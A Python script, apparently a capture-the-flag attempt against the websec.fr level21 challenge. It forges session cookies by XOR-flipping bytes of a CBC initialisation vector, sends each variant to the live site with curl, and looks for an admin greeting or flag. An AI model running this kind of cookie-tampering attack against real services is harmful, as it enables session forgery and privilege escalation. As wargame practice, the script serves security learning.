#!/usr/bin/env python3
import binascii
import subprocess
import sys
import re

cookie = "3c54c8bbdf06fa36b435837068f53c149bcfc5d06a599d2403d8a9c49c18c03f48fbec1c43b4dd354c6ea1c62b32966d7c0761cca9ef2a9bfb02d2dd5150ba8d8a44b56b426ea8aff342bc79f4665864"

iv_hex = cookie[:32]
ct_hex = cookie[32:]

iv_orig = bytearray(binascii.unhexlify(iv_hex))

print(f"IV length: {len(iv_orig)} bytes")
print(f"Probando XOR en cada byte del IV con valores específicos...\n")

# Username "test190607" empieza en posición 10 del plaintext
# Posiciones 10-19 en el bloque 0

# Probar XOR en posiciones del username para intentar cambiar a "admin"
# "test190607" → "admin....."

# Esto requeriría cambios precisos, pero puedo probar valores aleatorios

for pos in range(16):  # Probar cada byte del IV
    for xor_val in [0x01, 0x10, 0x20, 0x40]:  # Algunos valores de XOR
        iv_test = bytearray(iv_orig)
        iv_test[pos] ^= xor_val
        
        cookie_test = binascii.hexlify(iv_test).decode() + ct_hex
        
        cmd = f'timeout 6s curl -s https://websec.fr/level21/index.php --cookie "session={cookie_test}"'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, )
        
        if "WEBSEC{" in result.stdout:
            print(f"\n★★★ IV POS {pos}, XOR 0x{xor_val:02x}: FLAG! ★★★")
            flag = re.search(r'WEBSEC\{[^}]+\}', result.stdout).group(0)
            print(f"Flag: {flag}")
            sys.exit(0)
        
        if "Hello admin" in result.stdout:
            print(f"\n★★★ IV POS {pos}, XOR 0x{xor_val:02x}: ADMIN! ★★★")
            # Extraer flag
            flag_search = re.search(r'flag:\s*([A-Z0-9_{}<>]+)', result.stdout, re.IGNORECASE)
            if flag_search:
                print(f"Flag: {flag_search.group(1)}")
            print(result.stdout[1000:1500])
            sys.exit(0)
    
    sys.stdout.write(f"\rProbado IV byte: {pos}/16")
    sys.stdout.flush()

print(f"\n\nNo encontrado modificando IV")
